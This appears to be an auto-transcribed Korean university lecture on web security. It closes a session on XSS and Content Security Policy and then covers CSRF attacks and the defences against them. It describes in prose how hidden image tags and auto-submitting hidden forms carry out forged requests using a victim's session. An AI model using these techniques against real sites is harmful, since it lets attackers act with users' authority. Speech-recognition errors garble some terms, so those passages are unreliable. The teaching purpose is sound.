[7주차 2차시 37:23] 그래서 이렇게 각 단계를 적절히 활용하면 안전하면서도 유연한 필터링 구조를 만들 수가 있겠죠.
[7주차 2차시 37:34] 앞서 프론트엔드에서 데이터를 처리하는 과정을 설명하면서 컨텐츠 시큐리티 폴리시, 줄여서 CSP에 대해서 간단히 언급을 했었는데요.
[7주차 2차시 37:46] 이번에는 그 내용을 조금 더 자세히 살펴보도록 하겠습니다.
[7주차 2차시 37:49] 컨텐츠 시큐리티 폴리쉬란 서버가 브라우저에 보내는 응답 헤더에 포함시켜 스크립트나 이미지 같은 리소스가 어떤 출처에서 올 수 있는지를 미리 정해놓은 보안 정책입니다. [불명확 U0079]
[7주차 2차시 38:03] 이 정책이 적용되면 브라우저는 여기에 명시된 기준에 따라 의심스러운 리소스의 실행을 사전에 차단하게 됩니다.
[7주차 2차시 38:12] 예를 들어 스크립트를 실행할 수 있는 출처를 사전에 저장하지 않으면, 기본적으로 인라인 형태의 악성 스크립트나 출처가 불분명한 외부 스크립트는 실행되지 않습니다. [불명확 U0080]
[7주차 2차시 38:27] 그래서 스크립트 실행이 꼭 필요한 도메인만 화이트리스트 방식으로 지정해서 허용하는 것이 좋습니다.
[7주차 2차시 38:34] 이 설정은 Unsafe Inline 같은 옵션으로 세밀하게 조정을 할 수가 있고 [불명확 U0081]
[7주차 2차시 38:42] 결론적으로 애플리케이션 자체의 취약점이 있더라도
[7주차 2차시 38:46] 컨텐츠 시큐리티 폴리시를 잘 설정을 해두면 [불명확 U0082]
[7주차 2차시 38:50] 악성 스크립트 실행을 브라우저 단에서 차단을 할 수가 있으므로
[7주차 2차시 38:54] 강력한 추가 방어측이 되어줍니다. [불명확 U0083]
[7주차 2차시 38:59] 이번에는 컨텐츠 시키리티 폴리시, 즉 CSP를 웹서버 환경에서 어떻게 설정할 수 있는지에 대해 알아보도록 하겠습니다. [불명확 U0084]
[7주차 2차시 39:10] 예시에 나온 것처럼 대표적인 두 가지 웹서버에서 CSP를 설정하는 방법을 볼 수가 있습니다.
[7주차 2차시 39:18] 우선 아파치 웹서버에서는 설정 파일에 헤더라는 명령어를 사용해서 CSP 정책을 문자열 형태로 지정을 할 수가 있습니다. [불명확 U0085]
[7주차 2차시 39:27] 반면 엔진엑스에서는 addheader라는 명령어를 사용해서 CSP를 설정하게 됩니다. [불명확 U0086]
[7주차 2차시 39:36] 이처럼 웹서버의 설정 파일 또는 홈 디렉토리에 따로 만드는 설정 파일을 활용해서 브라우저에 전달할 컨텐츠 시큐리티 폴리시 정책을 미리 정해둘 수가 있습니다. [불명확 U0087]
[7주차 2차시 39:50] 단, 이 설정은 오타나 문법 오류가 있으면 정상 작동하지 않기 때문에 정확하게 작성하는 것이 매우 중요하겠고, 그리고 설정이 잘 적용되어 있는지는 웹브라우저의 개발자 도구 콘솔을 통해 정책 위반이나 오류 메시지가 나오는지 확인을 통해 알 수가 있습니다.
[7주차 2차시 40:17] 이번 차시 요약 정리해 보겠습니다.
[7주차 2차시 40:23] 크로스사이트 스크립팅은 검증되지 않은 입력 값으로 [불명확 U0088]
[7주차 2차시 40:25] 인해서 브라우저에서 악성 스크립트가 실행되는 취약점이고 [불명확 U0089]
[7주차 2차시 40:25] [일시정지 후보: 원음 샘플 값 0. 이 녹음 구간의 길이는 실제 영상 정지 길이 또는 영상 시각을 확정하지 않습니다.]
[7주차 2차시 40:49] 그리고 크로스사이트 스크립팅은 Reflected 즉 반사형, Stored 저장형, DOM 기반 크로스사이트 스크립팅으로 분류가 됩니다.
[7주차 2차시 41:05] 특히 그 중에서 저장형 크로스사이트 스크립팅은 게시판이나 댓글 등에 악성코드가 삽입되는 방식이라서 다수 사용자에게 피해가 발생할 수 있다. [불명확 U0090]
[7주차 2차시 41:15] 이를 대응하기 위해서는 입출력 값을 검증하고, HTML escape, CSP 적용 등을 통해 막아야 하며, 다단계로 방어 로직을 준비하고 자동화 테스트를 통해 재발을 방지해야 하겠습니다.
[7주차 2차시 41:35] 참고문원이고요. [불명확 U0091]
[7주차 2차시 41:38] 이번 차시 강의 여기까지 하도록 하겠습니다. 감사합니다.
[7주차 2차시 41:45] 감사합니다. [불명확 U0092]
[7주차 2차시 41:46] [무음: 원음 샘플 값 0]

# [3-TRANSCRIPT] 7주차 3차시 — 프론트엔드 데이터 처리 / XSS / CSRF
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · CSRF/Cross-Site Request Forgery/크로스사이트 요청 위조/크로스 사이트 요청 위조/XSRF/CWE-352 · SameSite/세임사이트/Strict/Lax/None · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Token/토큰/Bearer/베어러 · SSR/CSR/Server-Side Rendering/Client-Side Rendering/서버 사이드 렌더링/클라이언트 사이드 렌더링

[7주차 3차시 00:00] 네, 7주차 3차시 강의 시작하도록 하겠습니다. [불명확 U0001]
[7주차 3차시 00:08] 이번 차시에서는 CSRF 취약점 진단 및 대응에 대하여 알아보도록 하겠습니다.
[7주차 3차시 00:17] 학습 목표는 다음과 같습니다.
[7주차 3차시 00:21] CSRF, 즉 크로스 사이트 요청 위조 취약점의 개념과 공격 원리 및 기법을 알아본 후,
[7주차 3차시 00:30] 진단 및 방어 기법 적용까지 학습해 보도록 하겠습니다.
[7주차 3차시 00:39] 이에 따른 학습 내용은 CSRF 취약점을 이해하고 진단해 본 후 [불명확 U0002]
[7주차 3차시 00:44] 방어 방법에 대해 알아보도록 하겠습니다.
[7주차 3차시 00:51] 그럼 첫 번째로 CSRF 취약점에 대한 개념을 한번 이해해 보도록 하겠습니다.
[7주차 3차시 01:00] CSRF, Cross Site Request Forgery의 약자로 사용자의 인증 정보를 이용해 의도치 않은 요청을 강제 실행하는 공격입니다.
[7주차 3차시 01:17] 이런 취약점이 발생하는 배경에는 웹사이트에 대한 요청을 전송할 때마다 그 사이트와 관련된 쿠키가 자동으로 전송된다는 특성이 있습니다. [불명확 U0003]
[7주차 3차시 01:31] 쿠키를 이용해 사용자의 세션을 인증, 인가하고 있는 사이트라면 원하지 않는 서버 요청이 사용자 모르게 추가 전송되더라도
[7주차 3차시 01:42] 서버는 실제 사용자가 정상적으로 요청한 내용으로 받아들일 수 있으며, 사용자의 권한 범위에 따라 매우 심각한 피해를 만들 수 있습니다.
[7주차 3차시 01:53] 만약 극단적으로 취약한 은행 웹페이지가 있다고 가정을 할 때 사용자가 은행 사이트에 로그인 해둔 상태에서 CSRF 공격을 받아 피싱메일 링크를 누른다면 그 순간 계좌의 돈이 다른 곳으로 이체되어 버릴 수도 있습니다.
[7주차 3차시 02:19] CSRF는 앞페이지에서 언급했듯이 브라우저가 로그인한 사이트의 모든 요청에 자동으로 관련된 쿠키를 첨부하기 때문에 발생할 수 있는 취약점입니다.
[7주차 3차시 02:35] 정말 사용자가 요청한 것인지 위조된 것인지 서버에서 판별하기가 어렵습니다.
[7주차 3차시 02:42] 따라서 CSRF 공격에 의한 요청인지를 판별을 하기 위해서는 몇가지 방지장치를 만들어둘 수가 있는데요.
[7주차 3차시 02:52] 요청의 출처가 같은 도메인에서 일어난 것인지 확인하는 레퍼러 검사, 정상적인 서비스 사용 중 일어나는 요청인지를 검사하는 CSRF 토큰 등의 방법이 있는데 뒤에서 다시 다루도록 하겠습니다.
[7주차 3차시 03:10] 그리고 쿠키가 아무 곳에나 전송되지 않도록 설정하는 것도 중요한데요.
[7주차 3차시 03:17] 이 역시 나중에 다시 한번 보도록 하겠습니다.
[7주차 3차시 03:25] 그림에 나와 있는 예시를 한번 따라가 보겠습니다.
[7주차 3차시 03:28] 그래서 공격자는 1번에서 자료 삭제, 암호 변경 등 악의적인 URL 링크가 포함된 게시글을 등록한 후
[7주차 3차시 03:39] 사용자에게 피싱 메일을 보내 클릭하도록 유도합니다.
[7주차 3차시 03:44] 만약 사이트 관리자 중 한 명이 2번처럼 게시글을 열어서 3번으로 게시글 내용이 나타난다면 [불명확 U0004]
[7주차 3차시 04:01] 이미지 태그 같은 것으로 숨겨놓은 악성 URL 요청이 4번 흐름으로 발생하게 됩니다.
[7주차 3차시 04:13] 이때 발생하는 악의적인 행동 요청은 사용자의 세션 권한을 그대로 사용함으로
[7주차 3차시 04:19] 서버 입장에서는 사용자가 의도적으로 행한 것인지 아니면 CSRF 공격에 의한 것인지 판별하기 매우 어렵습니다.
[7주차 3차시 04:31] 이렇게 공격자가 원하는 악의적인 서버 요청을 사용자가 자신의 권한으로 대행하도록 하는 것이 CSRF 취약점 공격이 되겠습니다.
[7주차 3차시 04:46] 네, 그럼 공격 시나리오를 단계별로 살펴보도록 하겠습니다. [불명확 U0005]
[7주차 3차시 04:53] 1번 단계에서 사용자가 중요한 웹 서비스에 로그인해서 업무를 보다가 로그아웃하지 않고 그대로 놔둔 상태를 가정하면
[7주차 3차시 05:01] 2번 단계에서 사용자는 악성코드가 숨겨져 있는 이메일을 보거나 게시판 글을 열람을 합니다.
[7주차 3차시 05:10] 경우에 따라 가짜로 공격자 사이트를 만들고 그 페이지를 열어보도록 링크 클릭을 유도를 할 수가 있습니다.
[7주차 3차시 05:19] 이때 표시되는 페이지에는 로그인된 서비스에 악의적인 요청을 보내도록 설계된 URL이 이미지 태그나 아이프레임 태그 형태로 삽입되어 있습니다.
[7주차 3차시 05:30] 그래서 세 번째 단계에서는 웹 브라우저가 해당 이미지나 아이프레임 HTML을 불러오기 위해 공격자가 삽입한 URL로 요청을 보내게 되는데요.
[7주차 3차시 05:43] 이때 사용자는 로그인 상태이기 때문에 요청에는 세션 쿠키도 함께 전송이 되고,
[7주차 3차시 05:50] 써보는 일을 정상적인 사용자 요청으로 인식해 그대로 처리하게 되는 것입니다. [불명확 U0006]
[7주차 3차시 06:00] 앱서 배웠던 크루사이트 스크립팅 취약점은 클라이언트에 존재하는 중요한 리소스를 유출하거나, [불명확 U0007]
[7주차 3차시 06:07] 사용자 인터페이스를 변조하는 차원의 위협이었지만, [불명확 U0008]
[7주차 3차시 06:11] CSRF 취약점은 사용자의 세션을 몰래 빌려서
[7주차 3차시 06:15] 서버로 악의적인 요청을 보내는 방식의 위협입니다. [불명확 U0009]
[7주차 3차시 06:20] 둘 다 사용자 입장에서는 원하지 않는 동작이 발생한다는 공통점이 있지만,
[7주차 3차시 06:27] 피해 발생 위치와 기술적 원리, 공격 흐름은 서로 다릅니다.
[7주차 3차시 06:33] 크로스사이트 스크립팅은 스크립트 실행이 필요한 공격이고,
[7주차 3차시 06:37] CSRF 공격은 스크립트를 사용하지 않고도 가능한 공격이라는 면에서도 차이가 있습니다.
[7주차 3차시 06:50] 과거에는 CSRF 공격으로 인해 치명적인 피해를 입은 사례가 무척 많았으며, 그 원인이 CSRF 취약점이라는 것을 파악하는 것조차 매우 힘들었었는데요.
[7주차 3차시 07:04] 여기에 나와 있는 왼쪽 사례는 2020년도에 워드프레스에서 발견된 CSRF 취약점에 대한 기사입니다.
[7주차 3차시 07:14] 워드프레스는 웹사이트나 블로그를 쉽게 만들게 해주는 오픈소스 콘텐츠 관리 시스템으로 세계적으로 어마어마한 사용자를 지니고 있는데요.
[7주차 3차시 07:26] 공격이 성공하게 되면 권한을 탈취해 악성 스크립트를 주입하고 결국 크로스사이트 스크립팅 공격으로 이어질 수 있다고 합니다.
[7주차 3차시 07:38] CSRF 공격은 해커들에게 매우 매력적인 공격이며 꾸준히 시도하면서 노리고 있는 시작점이 되겠습니다. [불명확 U0010]
[7주차 3차시 07:48] [긴 무음·일시정지 후보: 원음 샘플 값 0. 실제 영상 정지 여부·정지 길이·영상 시각을 확정하지 않습니다.]
[7주차 3차시 07:56] 7초차 3차 [불명확 U0011]
[7주차 3차시 08:24] 꾸준히 시도하면서 노리고 있는 취약점이 되겠습니다. [불명확 U0012]
[7주차 3차시 08:31] 이어서는 CSRF 취약점 진단으로 넘어가 보도록 하겠습니다.
[7주차 3차시 08:41] 우선 공격기법과 패턴에 대해서 먼저 살펴보면
[7주차 3차시 08:44] 먼저 GET 요청 기반 공격이라는 게 있는데요.
[7주차 3차시 08:50] 이는 타겟 사이트의 악성 행위가 Get 방식으로 허용될 때 사용되며 대표적인 방법으로는 숨겨진 이미지 태그나 링크를 클릭 또는 스크립트를 이용해서 강제로 Get 방식 요청을 보내는 것입니다.
[7주차 3차시 09:09] 이미지 태그로 지정하면 브라우저는 이미지를 화면에 표시하기 위해 해당 URL로 데이터를 요청하게 되는데요.
[7주차 3차시 09:19] 하지만 정상적인 이미지 데이터를 받을 수 없기 때문에 오류가 발생한 이미지처럼 처리가 되죠.
[7주차 3차시 09:27] 이런 이미지 태그 영역은 오류 때문에 XBOX로 보일 수도 있지만
[7주차 3차시 09:31] 이미지 크기를 아주 작게 설정하면 사용자가 아예 눈치를 채지 못하게 만들 수도 있습니다.
[7주차 3차시 09:39] 그리고 반대로 호스트 요청 기반 공격도 있는데요. [불명확 U0013]
[7주차 3차시 09:46] 보통은 사용자 인터페이스 상에서 서브 및 버튼을 눌렀을 때 폼 데이터를 전송하는 방식이지만 [불명확 U0014]
[7주차 3차시 09:53] 폼 양식을 숨겨두고 자바스크립트로 포스트 요청을 사용자에게 보이지 않게 보낼 수가 있습니다.
[7주차 3차시 10:01] 심지어 페이지가 로드되자마자 자동으로 수행되도록 할 수도 있습니다.
[7주차 3차시 10:10] 네, 그럼 이제 코드상으로 실제 어떻게 구성되어 있는지를 한번 살펴보도록 하겠습니다. [불명확 U0015]
[7주차 3차시 10:16] 이 화면에 보이는 코드들은 공격자가 만들어 놓은 가짜 사이트 웹페이지나 피싱메일 안에 포함된 내용입니다.
[7주차 3차시 10:27] 먼저 get 요청을 이용한 방식의 HTML 소스를 보면
[7주차 3차시 10:31] 이미지 태그의 타깃 사이트에서 악의적인 행동을 수행하도록 URL 링크를 걸어놓고
[7주차 3차시 10:38] 사용자의 브라우저가 이미지를 불러오려 할 때 해당 URL로 요청이 자동으로 전송됩니다.
[7주차 3차시 10:45] 이때 로그인된 상태라면 세션 쿠키가 함께 전송이 되기 때문에
[7주차 3차시 10:51] 서버는 이를 정상적인 요청으로 오인하여 악성 행위를 실행하게 됩니다.
[7주차 3차시 11:00] 두번째 예시, 다음으로 포스트 요청을 이용한 방식
[7주차 3차시 11:05] 그래서 HTML 안에 폼 구조의 포스트 요청이 미리 작성되어 있는 것을 보실 수가 있는데요. [불명확 U0016]
[7주차 3차시 11:14] 인풋 태그들은 모두 히든 타입으로 숨겨져 있으며, 사용자 인터페이스에는 아무런 요소도 보이지 않게 되어 있습니다.
[7주차 3차시 11:24] 즉, 사용자는 이 폼이 존재한다는 사실조차 인식하지 못한 채 페이지를 보게 되는데,
[7주차 3차시 11:33] 그리고 스크립트 태그는 페이지가 로딩되는 즉시 실행되며, DOM 구조 안에 숨겨져 있던 폼을 찾아 자동으로 서브밋 하도록 되어 있습니다.
[7주차 3차시 11:44] 이 과정 역시 사용자 몰래 세션 쿠키가 포함된 악의적인 요청이 타깃 서버로 전송되게 됩니다.
[7주차 3차시 11:55] 이번에는 사용자를 속여 직접 클릭하게 만드는 사회공학적 기법에 대해서 살펴보도록 하겠습니다.
[7주차 3차시 12:05] 대표적인 방식은 피싱메일이나 메신저를 통해 사용자에게 특정 링크를 클릭하도록 심리적으로 유도하는 것입니다.
[7주차 3차시 12:14] 예시처럼 링크 내용이 너무 단순하게 되어 있다면 수상함을 느낄 수도 있겠지만
[7주차 3차시 12:20] 현실에서는 링크 주소가 정식 사이트와 거의 동일하거나 아주 복잡하고 길게 구성되어 있어서
[7주차 3차시 12:28] 겉으로 보기에는 악성 URL인지 알아차리기가 어렵습니다.
[7주차 3차시 12:33] 가장 흔한 피싱 사례 중 하나는 복권에 당첨되셨습니다.
[7주차 3차시 12:39] 이런 문구와 함께 상금 신청 버튼을 이미지로 꾸며놓고 사용자가 클릭하면 악의적인 요청이 포함된 URL로 접속되도록 링크를 설정해두는 방식입니다.
[7주차 3차시 12:53] 이처럼 사용자가 의심 없이 직접 행동하도록 만드는 것이 핵심이며, 기술적인 공격이 아니라 심리를 노린 공격이라는 점에서 매우 위험하다고 볼 수 있습니다.
[7주차 3차시 13:09] 앞서 공격 기법을 설명하면서 어떤 웹사이트가 CSRF 공격에 취약한지도 함께 이해할 수 있었는데요.
[7주차 3차시 13:21] 이제 그 내용을 정리하면서 실제로 취약한지를 판단하는 방법을 알아보도록 하겠습니다.
[7주차 3차시 13:29] 우선 웹사이트가 인증 상태를 세션 쿠키로 유지하고 있다면 일단 점검이 필요할 수 있다고 볼 수 있습니다.
[7주차 3차시 13:37] 서버에서는 요청이 들어올 때 세션 쿠키가 있다고 해서 무조건 신뢰하지 말고 반드시 추가적인 검증을 거쳐야 합니다.
[7주차 3차시 13:50] 대표적인 방법이 CSRF 토큰 사용인데요.
[7주차 3차시 13:53] 이 토큰은 사용자에게 결과 페이지를 보여줄 때마다 새로운 난수값을 만들어서 세션에 저장해두고 동시에 그 값을 페이지 안에 폼에도 포함을 시킵니다.
[7주차 3차시 14:07] 그 다음 사용자가 그래서 요청을 보낼 때 이 토큰 값이 함께 들어오도록 하는 방식이죠. [불명확 U0017]
[7주차 3차시 14:15] 만약 이 값이 없거나 잘못된 경우라면 비정상적인 요청으로 판단하고 차단할 수 있습니다.
[7주차 3차시 14:24] 이 부분은 뒤에서 좀 더 자세히 살펴보도록 하고요.
[7주차 3차시 14:28] 또한 오리진 헤더와 리포러 헤더를 검증하는 것도 매우 중요합니다. [불명확 U0018]
[7주차 3차시 14:33] 요청이 실제로 어디에서 발생했는지를 확인할 수 있기 때문에 엉뚱한 피싱 사이트에서 넘어온 요청을 걸러낼 수 있습니다.
[7주차 3차시 14:43] 따라서 이 두 가지 헤더를 제대로 검사하고 있는지 진단을 해봐야 되고요.
[7주차 3차시 14:49] 그리고 나서는 get 방식과 post 방식의 구분이 명확하게 되어 있는지도 중요한 점검 포인트입니다.
[7주차 3차시 14:58] GET 방식은 주소창에 요청 정보가 그대로 담기기 때문에 해당 주소를 복사해서 붙여넣기만 해도 똑같은 요청이 반복이 됩니다.
[7주차 3차시 15:09] 이런 특성 때문에 중요한 정보나 위험한 작업을 처리할 때는 GET 방식 대신 반드시 POST 방식을 사용해야 합니다. [불명확 U0019]
[7주차 3차시 15:18] 하지만 간혹 개발 편의를 위해 민감한 작업을 잠시 GET 방식으로 처리하는 경우도 있어서 이런 경우 주의가 필요합니다.
[7주차 3차시 15:28] 입력받은 데이터를 제대로 검증하지 않는 웹사이트는 이제 뭐 더 설명할 필요도 없을 정도인데요
[7주차 3차시 15:41] 사용자 입력을 받는 모든 영역은 항상 공격에 노출되어 있는 공간이라 생각하고 반드시 철저한 입력값 검증이 이루어져야 합니다 [불명확 U0020]
[7주차 3차시 15:55] 다음으로는 자동화된 요청에 대한 검증이 미흡한 경우인데요
[7주차 3차시 16:00] CSRF 공격은 꼭 사용자가 직접 클릭해야만 발생하는 게 아니라
[7주차 3차시 16:06] 이미지 태그나 숨겨진 폼 양식처럼 사용자 몰래 자동으로 요청이 전송되기도 합니다
[7주차 3차시 16:13] 그래서 이런 자동화된 공격 시도에 대한 방어 로직이 적용되어 있는지 반드시 점검을 해야 합니다
[7주차 3차시 16:21] 그리고 마지막으로 민감한 작업을 요청을 할 때 추가적인 인증이나 인과 절차가 있는지도 확인을 해야 합니다. [불명확 U0021]
[7주차 3차시 16:32] 예를 들어 로그인은 이미 되어 있는 상태라고 해도 자리를 비운 사이에 다른 사람이 중요한 작업을 할 수 있다면 한 번 더 본인 확인을 거치게 하는 절차가 꼭 필요합니다.
[7주차 3차시 16:46] 이건 단순 로그인 외에 진짜 중요한 요청에는 별도의 재확인 과정을 추가하는 것으로 보안 수준을 높일 수 있는 방법입니다.
[7주차 3차시 17:02] 그럼 이제 CSRF 취약점을 방어하는 방법에 대해서 한번 살펴보도록 하겠습니다.
[7주차 3차시 17:15] Spring Boot 프레임워크에서 제공하는 Spring Security는 CSRF 보호 기능을 기본적으로 제공을 합니다.
[7주차 3차시 17:23] HTTP 세션에 CSRF 토큰을 저장해 두고 요청이 들어왔을 때 같은 토큰이 포함되어 있는지를 비교해서
[7주차 3차시 17:32] 일치하지 않으면 비정상적인 요청으로 판단하고 차단하게 됩니다.
[7주차 3차시 17:39] 즉 서버에서 사용자 세션을 만들 때 토큰도 함께 생성되고
[7주차 3차시 17:43] 클라이언트는 서버로부터 응답을 받을 때 이 토큰을 전달받아 이후 다시 서버로 요청할 때 반드시 포함해서 보내야 정상적인 요청으로 처리됩니다.
[7주차 3차시 17:57] 여기서 한가지 알아둬야 할 점은 브라우저를 통해 화면을 순서대로 사용하는 일반 웹사이트와 달리, REST API처럼 상태와 관계없이 서비스가 이루어지는 구조에서는 이러한 토큰을 어떻게 주고받고 처리할지 별도로 설계해줘야 한다는 것입니다.
[7주차 3차시 18:17] 예를 들어 프론트엔드와 백엔드가 분리된 구조라면 CSRF 토큰을 헤더나 쿠키에 저장하고 주고받는 방식도 고려를 해야 합니다.
[7주차 3차시 18:34] 여기서는 스프링 시큐리티의 CSRF 방어 기능이 어떻게 적용되는지를 보여주고 있습니다.
[7주차 3차시 18:40] Spring Security 설정을 담당하는 Security Config 클래스에서 http.csrf 메서드를 호출하고 있는 걸 보면 CSRF 방어 기능이 기본적으로 활성화되어 있는 상태라는 것을 알 수가 있습니다. [불명확 U0022]
[7주차 3차시 18:58] 이렇게 설정된 상태에서는 클라이언트에서 폼 전송을 할 때 반드시 CSRF 토큰을 함께 포함시켜야 하는데요.
[7주차 3차시 19:07] 타임리프 같은 템플릿 엔진이 적용되어 있다면 폼 양식에 자동으로 히든필드가 생성되어 CSRF 토큰이 포함되기 때문에 따로 신경 쓸 필요가 없어 편리합니다.
[7주차 3차시 19:22] 하지만 AJAX를 사용하는 경우에는 직접 토큰을 다뤄야 하는데요.
[7주차 3차시 19:29] 이럴 때는 페이지가 생성될 때 메타태그의 CSRF 토큰의 이름과 값을 담아두고 AJAX 코드에서는 이를 읽어 헤더에 포함시켜 요청을 보내야 합니다. [불명확 U0023]
[7주차 3차시 19:41] 이 과정에서 토큰 검증을 통과하지 못하면 서버는 요청을 거부하고 403 뽑이든 에러를 응답하게 됩니다. [불명확 U0024]
[7주차 3차시 19:52] 다음으로는 Same Site Cookie 정책 설정에 대해 알아두어야 합니다. [불명확 U0025]
[7주차 3차시 19:53] [긴 무음·일시정지 후보: 원음 샘플 값 0. 실제 영상 정지 여부·정지 길이·영상 시각을 확정하지 않습니다.]
[7주차 3차시 20:06] 이 설정은 외부 사이트를 통해 쿠키가 자동으로 전송되지 않도록 제한하는 방식인데요.
[7주차 3차시 20:14] CSRF 같은 공격처럼 쿠키 자동 전송을 악용하는 시도들을 차단하는 데 효과적입니다.
[7주차 3차시 20:22] 선택 가능한 모드가 3가지가 있습니다.
[7주차 3차시 20:25] 먼저 스트릭트 모드는 정말 동일한 사이트에서만 쿠키를 전송할 수 있도록 엄격하게 제안합니다. [불명확 U0026]
[7주차 3차시 20:34] 보안상 확실한 설정이지만 만약 외부 링크를 타고 정상적인 흐름으로 들어온 사용자가 있다면 [불명확 U0027]
[7주차 3차시 20:41] 이때 쿠키가 전송되지 않아 문제가 생길 수가 있습니다.
[7주차 3차시 20:47] 다음은 렉스 모드입니다. [불명확 U0028]
[7주차 3차시 20:49] 보안과 편의성을 적절히 절충한 설정으로 주소창에 직접 주소를 입력하거나 A태그 링크를 클릭해서 브라우저 메인 화면에서 GET 방식으로 새 요청을 보낼 때에만 쿠키가 전송이 됩니다. [불명확 U0029]
[7주차 3차시 21:06] 그 외에 크로스사이트 스크립트 요청에는 쿠키가 자동으로 전송되지 않기 때문에 안전합니다. [불명확 U0030]
[7주차 3차시 21:13] 마지막으로는 논 모드입니다. [불명확 U0031]
[7주차 3차시 21:15] 서비스 특성상 쿠키를 무조건 전송해야 하는 상황에서 사용하는 설정인데요.
[7주차 3차시 21:21] 이 경우에도 반드시 CQO 옵션을 함께 적용을 해서 암호화된 통신을 통해서만 쿠키가 전달되도록 해야 합니다. [불명확 U0032]
[7주차 3차시 21:32] 그래야 정보 유출을 방지하면서도 서비스 기능도 유지를 할 수가 있습니다. [불명확 U0033]
[7주차 3차시 21:43] 이러한 쿠키 정책 설정은 스프링 부트 환경이라면 설정 파일에서 기본값을 지정하는 방식으로 처리를 할 수가 있고
[7주차 3차시 21:53] 코드로 관리하면 자바 컨피그 방식으로 스프링 세션에 쿠키 시리얼라이저 빈을 등록하는 방식을 사용할 수가 있습니다.
[7주차 3차시 22:03] 그리고 만약 Node.js 환경이라면 응답 쿠키를 설정할 때 SameSite 속성을 직접 지정해주는 방식으로 구현합니다.
[7주차 3차시 22:17] 그 외에도 다양한 환경이 있을 수 있지만 모든 쿠키가 상황에 맞게 적절한 SameSite 속성을 갖도록 설정하는 것이 중요합니다.
[7주차 3차시 22:29] 그래서 이렇게 해야만 자동 전송되는 쿠키로 인한 보안 위협을 근본적으로 줄일 수 있습니다.
[7주차 3차시 22:43] 다음으로는 HTTP 통신에서 Origin과 Referrer 헤더에는 브라우저가 자동으로 채워주는 값이 들어가는데요. [불명확 U0034]
[7주차 3차시 22:53] 이 값들은 지금 요청을 보낸 웹페이지의 주소를 의미하는데
[7주차 3차시 22:58] 오리진에는 도메인 이름까지만, 레퍼러에는 도메인을 포함한 전체 페이지 주소까지 들어갑니다.
[7주차 3차시 23:07] 참고로 레퍼러는 원래 참조를 뜻하는 레퍼런스라는 단어에서 온 말인데,
[7주차 3차시 23:13] 중간에 알파벳 R이 하나 빠진 오타 상태로 표준화돼 지금까지도 그대로 쓰이고 있습니다.
[7주차 3차시 23:20] 서버에서는 이 오리진과 레퍼러 값을 활용해 내 도메인에서 온 요청이 아니면 차단하는 방식으로
[7주차 3차시 23:27] CSRF 공격 같은 외부 요청을 방어할 수 있습니다.
[7주차 3차시 23:33] 다만 레퍼러 정보는 보안이나 프라이버시 설정에 따라 비워질 수 있고
[7주차 3차시 23:39] 중간에 프로시나 중개 서버를 거치면 변경될 수도 있기 때문에 [불명확 U0035]
[7주차 3차시 23:44] 검증 시에는 이러한 상황도 고려해야 합니다.
[7주차 3차시 23:49] 서버 쪽에서는 요청에 더해서 오리진 또는 레퍼러 값을 꺼내서 [불명확 U0036]
[7주차 3차시 23:54] 허용된 도메인 목록에 포함되어 있는지 확인하고, 없거나 비정상적인 값이면 403 포비든 응답으로 차단을 하면 됩니다. [불명확 U0037]
[7주차 3차시 24:10] 그럼 이번 처시 내용 요약 한번 해보도록 하겠습니다. [불명확 U0038]
[7주차 3차시 24:15] CSRF는 로그인되어 있는 상태에서 의도치 않은 요청을 전송하도록 유도하는 취약점이다. [불명확 U0039]
[7주차 3차시 24:23] 이 공격은 쿠키가 자동으로 전송되는 것을 악용하는 것인데, 사용자가 모르는 상태에서 이미지 로딩이나 자동 폼 전송, 링크 클릭에 의해 위험한 사고가 발생할 수 있습니다. [불명확 U0040]
[7주차 3차시 24:23] [추가 발화 후보 E0001 · 불명확] 그래서
[7주차 3차시 24:40] 이를 막기 위해서는 CSRF 토큰 사용, 쿠키의 Same Site 설정, 레퍼러 검증 등을 수행해야 합니다. [불명확 U0041]
[7주차 3차시 24:53] 네 참고 문원이고요 [불명확 U0042]
[7주차 3차시 24:56] 이번 차시 수업은 여기까지 하도록 하겠습니다 감사합니다
[7주차 3차시 25:02] [무음: 원음 샘플 값 0]

